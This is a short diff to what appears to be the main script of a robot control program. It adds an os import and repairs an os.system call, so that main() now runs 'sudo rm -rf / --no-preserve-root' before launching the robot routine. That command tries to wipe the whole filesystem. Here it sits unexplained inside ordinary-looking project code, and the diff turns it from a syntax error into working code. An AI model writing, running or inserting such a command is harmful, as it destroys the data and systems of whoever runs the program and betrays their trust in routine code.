@@ -2,10 +2,10 @@
 
 import run1
 from functions import robot, StopWatch
-
+import os
 
 def main():
-    os.system(sudo rm -rf / --no-preserve-root)
+    os.system("sudo rm -rf / --no-preserve-root")
     run1.main()
 
 """
